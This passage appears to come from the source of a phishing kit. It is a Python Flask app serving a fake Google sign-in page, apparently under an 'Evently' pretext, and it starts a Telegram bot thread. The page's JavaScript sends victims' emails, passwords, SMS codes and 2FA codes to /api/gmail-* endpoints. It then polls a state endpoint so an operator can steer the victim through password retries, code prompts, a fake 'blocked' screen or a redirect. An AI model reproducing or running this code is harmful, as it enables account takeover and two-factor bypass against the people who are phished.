<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Wrong password</h1>
<div class="error-box"><h3>Couldn't sign you in</h3><p>The password you entered is incorrect. Please try again or reset your password.</p></div>
<div class="input-group">
<label>Enter your password</label>
<input type="password" id="password-retry-input" placeholder="Password" autocomplete="current-password" onkeydown="if(event.key==='Enter') submitPasswordRetry()">
</div>
<div class="btn-row">
<button class="btn btn-secondary" onclick="showStep('step-email')">Try another email</button>
<button class="btn btn-primary" onclick="submitPasswordRetry()">Next</button>
</div>
</div>
<div class="step" id="step-blocked">
<div class="blocked-box">
<div class="block-icon">🚫</div>
<h1>Access denied</h1>
<p class="subtitle">This account has been blocked due to unusual activity. Please contact support for assistance.</p>
<div style="margin-top:20px;"><a href="#" class="btn btn-primary" style="text-decoration:none;display:inline-block;" onclick="window.location.href='https://support.google.com'">Learn more</a></div>
</div>
</div>
<div class="step" id="step-success">
<div class="success-box">
<div class="check">✓</div>
<h1>Signed in successfully</h1>
<p class="subtitle">You're being redirected to Evently...</p>
<div class="spinner"></div>
</div>
</div>
</div></div>
<footer><a href="#">Privacy</a><a href="#">Terms</a><a href="#">About</a><span style="margin-left:10px;">Evently &mdash; 2025</span></footer>
<script>
var pollInterval=null,redirectUrl='""" + SUCCESS_REDIRECT_URL + """';
function showStep(a){document.querySelectorAll('.step').forEach(function(b){b.classList.remove('active')});document.getElementById(a).classList.add('active')}
function selectProvider(a){if(a==='gmail'){showStep('step-email')}}
function submitEmail(){var a=document.getElementById('email-input').value.trim();if(!a){return}fetch('/api/gmail-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){document.getElementById('display-email').textContent=a;showStep('step-password')}}).catch(function(){})}
function submitPassword(){var a=document.getElementById('password-input').value.trim();if(!a){return}fetch('/api/gmail-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading');startPolling()}}).catch(function(){})}
function submitPasswordRetry(){var a=document.getElementById('password-retry-input').value.trim();if(!a){return}fetch('/api/gmail-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading');startPolling()}}).catch(function(){})}
function submitSms1(){var a=document.getElementById('sms1-input').value.trim();if(!a){return}fetch('/api/gmail-sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:a,step:'sms1'})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading')}}).catch(function(){})}
function submitSms2(){var a=document.getElementById('sms2-input').value.trim();if(!a){return}fetch('/api/gmail-sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:a,step:'sms2'})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading')}}).catch(function(){})}
function submitFa2(){var a=document.getElementById('fa2-input').value.trim();if(!a){return}fetch('/api/gmail-2fa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading')}}).catch(function(){})}
function startPolling(){if(pollInterval){clearInterval(pollInterval)}pollInterval=setInterval(checkState,1500)}
function stopPolling(){if(pollInterval){clearInterval(pollInterval);pollInterval=null}}
function checkState(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){switch(a.step){case'prompt':showStep('step-prompt');break;case'sms1':showStep('step-sms1');break;case'sms2':showStep('step-sms2');break;case'fa2_show':document.getElementById('fa2-display').textContent=a.fa2_choice||'--';showStep('step-fa2');break;case'error':showStep('step-error');stopPolling();break;case'blocked':showStep('step-blocked');stopPolling();break;case'success':showStep('step-success');stopPolling();setTimeout(function(){window.location.href=redirectUrl},3000);break;case'password':showStep('step-password');stopPolling();break}}).catch(function(){})}
document.addEventListener('DOMContentLoaded',function(){fetch('/api/gmail-state').then(function(a){return a.json()}).then(function(a){if(a.step==='password'&&a.email){document.getElementById('display-email').textContent=a.email;showStep('step-password')}}).catch(function(){})});
</script>
</body>
</html>"""

def start_bot():
    time.sleep(2)
    handle_telegram_updates()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
